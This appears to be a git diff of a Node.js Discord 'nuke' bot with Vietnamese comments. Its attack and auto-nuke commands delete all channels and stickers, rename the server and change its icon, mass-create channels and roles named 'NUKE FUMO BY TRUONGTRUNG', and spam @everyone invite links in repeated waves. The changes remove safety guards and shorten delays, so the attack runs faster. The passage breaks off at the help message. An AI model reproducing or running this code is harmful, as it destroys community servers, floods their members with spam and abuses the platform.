@@ -4,9 +4,6 @@ const path = require('path');
 const sizeOf = require('image-size');
 
 let autoNukeActive = false;
-let attackActive = false;
-let shuffleChannelsActive = false;
-let shuffleRolesActive = false;
 
 async function loadConfig() {
     const configPath = path.join(__dirname, 'config.json');
@@ -55,8 +52,7 @@ function getRandomColor() {
 async function shuffleChannels(guild, duration = 60000) {
     const endTime = Date.now() + duration;
 
-    shuffleChannelsActive = true;
-    while (Date.now() < endTime && shuffleChannelsActive) {
+    while (Date.now() < endTime) {
         const channels = Array.from(guild.channels.cache.values());
         const shuffledChannels = shuffleArray(channels);
 
@@ -66,16 +62,14 @@ async function shuffleChannels(guild, duration = 60000) {
         }
 
         await Promise.all(setPositionPromises);
-        await new Promise(resolve => setTimeout(resolve, 22000)); // Wait 22 seconds before the next shuffle
+        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before the next shuffle
     }
-    shuffleChannelsActive = false;
 }
 
 async function shuffleRoles(guild, duration = 60000) {
     const endTime = Date.now() + duration;
 
-    shuffleRolesActive = true;
-    while (Date.now() < endTime && shuffleRolesActive) {
+    while (Date.now() < endTime) {
         const roles = Array.from(guild.roles.cache.values());
         const shuffledRoles = shuffleArray(roles);
 
@@ -87,129 +81,85 @@ async function shuffleRoles(guild, duration = 60000) {
         await Promise.all(setPositionPromises);
         await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before the next shuffle
     }
-    shuffleRolesActive = false;
 }
 
 async function performAttack(guild, config) {
     console.log('Performing attack on guild:', guild.name);
-    attackActive = true;
 
+    // Xóa kênh và sticker cũ
+    const deleteChannelsPromise = Promise.all(guild.channels.cache.map(channel => channel.delete().catch(console.error)));
+    const deleteStickersPromise = guild.stickers.fetch().then(stickers => Promise.all(stickers.map(sticker => sticker.delete().catch(console.error))));
+
+    // Đặt lại tên và icon server
+    const setNamePromise = guild.setName(config.newServerName).catch(console.error);
+    const setIconPromise = fs.readFile('./icon.jpg').then(iconJpg => guild.setIcon(iconJpg).catch(console.error));
+
+    // Tạo 40 kênh và 10 vai trò
+    const channelNames = Array(40).fill('NUKE FUMO BY TRUONGTRUNG');
+    const roleNames = Array(10).fill('NUKE FUMO BY TRUONGTRUNG');
+    const createChannelsPromise = Promise.all(channelNames.map(name => guild.channels.create({ name, type: 0 })));
+    const createRolesPromise = Promise.all(roleNames.map(name => guild.roles.create({ 
+        name, 
+        permissions: [], 
+        color: getRandomColor() // Màu sắc ngẫu nhiên
+    }).catch(console.error)));
+
+    // Tạo sticker
+    let createStickersPromise = Promise.resolve();
     try {
-        // Delete channels and stickers
-        const deleteChannelsPromise = Promise.all(guild.channels.cache.map(channel => channel.delete().catch(console.error)));
-        const deleteStickersPromise = guild.stickers.fetch().then(stickers => Promise.all(stickers.map(sticker => sticker.delete().catch(console.error))));
+        const iconPngBuffer = await validateImage('./converted_image.png');
+        createStickersPromise = Promise.all(
+            Array.from({ length: 5 }, (_, i) => 
+                guild.stickers.create({
+                    file: iconPngBuffer,
+                    name: `Sticker${i + 1}`,
+                    description: `Description for Sticker${i + 1}`,
+                    tags: `sticker${i + 1}`
+                }).catch(console.error)
+            )
+        );
+    } catch (error) {
+        console.error('Error validating or creating sticker:', error);
+    }
 
-        // Set server name and icon
-        const setNamePromise = guild.setName(config.newServerName).catch(console.error);
-        const setIconPromise = fs.readFile('./icon.jpg').then(iconJpg => guild.setIcon(iconJpg).catch(console.error));
+    // Thực hiện tất cả các lời hứa cùng lúc
+    await Promise.all([
+        deleteChannelsPromise,
+        setNamePromise,
+        setIconPromise,
+        createChannelsPromise,
+        createRolesPromise,
+        deleteStickersPromise,
+        createStickersPromise
+    ]);
 
-        // Create 40 channels
-        const channelNames = Array(30).fill('NUKE FUMO BY TRUONGTRUNG');
-        const createChannelsPromise = createChannelsConcurrently(guild, channelNames, 20); // Increase batch size to 20
-
-        // Create stickers
-        let createStickersPromise = Promise.resolve();
-        try {
-            const iconPngBuffer = await validateImage('./converted_image.png');
-            createStickersPromise = Promise.all(
-                Array.from({ length: 5 }, (_, i) =>
-                    guild.stickers.create({
-                        file: iconPngBuffer,
-                        name: `Sticker${i + 1}`,
-                        description: `Description for Sticker${i + 1}`,
-                        tags: `sticker${i + 1}`
-                    }).catch(console.error)
-                )
-            );
-        } catch (error) {
-            console.error('Error validating or creating sticker:', error);
+    // Spam tin nhắn
+    const newChannels = await createChannelsPromise;
+    const spamPromises = [];
+    for (let i = 0; i < 5; i++) {
+        for (const channel of newChannels) {
+            spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
         }
+    }
+    await Promise.all(spamPromises);
+}
 
-        // Perform all promises simultaneously
-        await Promise.all([
-            deleteChannelsPromise,
-            setNamePromise,
-            setIconPromise,
-            createChannelsPromise,
-            deleteStickersPromise,
-            createStickersPromise
-        ]);
+async function autoNuke(guild, config) {
+    autoNukeActive = true;
+    const newChannels = await guild.channels.fetch();
+    const endTime = Date.now() + 3 * 60 * 1000; // 3 minutes from now
 
-        // Spam messages
-        const newChannels = await createChannelsPromise;
+    while (autoNukeActive && Date.now() < endTime) {
         const spamPromises = [];
-        for (let i = 0; i < 10; i++) {
-            for (const channel of newChannels) {
-                if (channel.isTextBased()) {
-                    spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
-                }
+        for (const channel of newChannels.values()) {
+            if (channel.isTextBased()) {
+                spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
             }
         }
         await Promise.all(spamPromises);
-
-        // Create 10 roles
-        const roleNames = Array(10).fill('NUKE FUMO BY TRUONGTRUNG');
-        const createRolesPromise = createRolesConcurrently(guild, roleNames, 10); // Increase batch size to 10
-        await createRolesPromise;
-
-    } finally {
-        attackActive = false;
+        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before next spam wave
     }
-}
-
-async function createChannelsConcurrently(guild, channelNames, batchSize) {
-    const createdChannels = [];
-    let i = 0;
-    while (i < channelNames.length) {
-        const batch = channelNames.slice(i, i + batchSize);
-        const batchPromises = batch.map(name => guild.channels.create({ name, type: 0 }).catch(console.error));
-        const batchResults = await Promise.all(batchPromises);
-        createdChannels.push(...batchResults);
-        i += batchSize;
-    }
-    return createdChannels;
-}
-
-async function createRolesConcurrently(guild, roleNames, batchSize) {
-    const createdRoles = [];
-    let i = 0;
-    while (i < roleNames.length) {
-        const batch = roleNames.slice(i, i + batchSize);
-        const batchPromises = batch.map(name => guild.roles.create({
-            name,
-            permissions: [],
-            color: getRandomColor()
-        }).catch(console.error));
-        const batchResults = await Promise.all(batchPromises);
-        createdRoles.push(...batchResults);
-        i += batchSize;
-    }
-    return createdRoles;
-}
-
-async function createRolesInBatches(guild, roleNames, batchSize) {
-    const createdRoles = [];
-    for (let i = 0; i < roleNames.length; i += batchSize) {
-        const batch = roleNames.slice(i, i + batchSize);
-        const batchPromises = batch.map(name => guild.roles.create({
-            name,
-            permissions: [],
-            color: getRandomColor()
-        }).catch(console.error));
-        const batchResults = await Promise.all(batchPromises);
-        createdRoles.push(...batchResults);
-    }
-    return createdRoles;
-}
-
-async function batchPromises(items, batchSize, fn) {
-    const results = [];
-    for (let i = 0; i < items.length; i += batchSize) {
-        const batch = items.slice(i, i + batchSize);
-        const promises = batch.map(item => fn(item));
-        results.push(...await Promise.all(promises));
-    }
-    return results;
+    autoNukeActive = false;
 }
 
 async function main() {
@@ -239,12 +189,13 @@ async function main() {
         const args = message.content.slice(prefix.length).trim().split(/ +/);
         const command = args.shift()?.toLowerCase();
 
+        if (autoNukeActive && (command === 'attack' || command === 'shuffle_channels')) {
+            message.channel.send('Cannot use this command while auto nuke is active.');
+            return;
+        }
+
         if (command === 'attack') {
-            if (!autoNukeActive && !shuffleChannelsActive && !shuffleRolesActive) {
-                await performAttack(message.guild, config);
-            } else {
-                message.channel.send('Cannot perform attack while auto nuke, shuffle channels, or shuffle roles is active.');
-            }
+            await performAttack(message.guild, config);
         } else if (command === 'unban_all') {
             try {
                 const bans = await message.guild.bans.fetch();
@@ -257,12 +208,11 @@ async function main() {
             }
         } else if (command === 'auto_nuke') {
             if (args[0] === 'on') {
-                if (!autoNukeActive && !shuffleChannelsActive && !shuffleRolesActive) {
+                if (!autoNukeActive) {
                     message.channel.send('Auto nuke started.');
-                    autoNukeActive = true;
                     autoNuke(message.guild, config);
                 } else {
-                    message.channel.send('Cannot start auto nuke while shuffle channels or shuffle roles is active.');
+                    message.channel.send('Auto nuke is already running.');
                 }
             } else if (args[0] === 'off') {
                 if (autoNukeActive) {
@@ -275,23 +225,15 @@ async function main() {
                 message.channel.send('Invalid argument. Use "on" or "off".');
             }
         } else if (command === 'shuffle_channels') {
-            if (!autoNukeActive && !attackActive && !shuffleRolesActive) {
-                shuffleChannels(message.guild, 60000).then(() => {
-                    message.channel.send('Shuffled all channels.');
-                });
-            } else {
-                message.channel.send('Cannot shuffle channels while auto nuke, attack, or shuffle roles is active.');
-            }
+            shuffleChannels(message.guild, 60000).then(() => {
+                message.channel.send('Shuffled all channels.');
+            });
         } else if (command === 'shuffle_roles') {
-            if (!autoNukeActive && !attackActive && !shuffleChannelsActive) {
-                shuffleRoles(message.guild, 60000).then(() => {
-                    message.channel.send('Shuffled all roles.');
-                });
-            } else {
-                message.channel.send('Cannot shuffle roles while auto nuke, attack, or shuffle channels is active.');
-            }
+            shuffleRoles(message.guild, 60000).then(() => {
+                message.channel.send('Shuffled all roles.');
+            });
         } else if (command === 'help') {
-            const helpMessage = `
+const helpMessage = `
 **Available Commands:**
 \`\`\`
 !attack - Perform an attack on the server
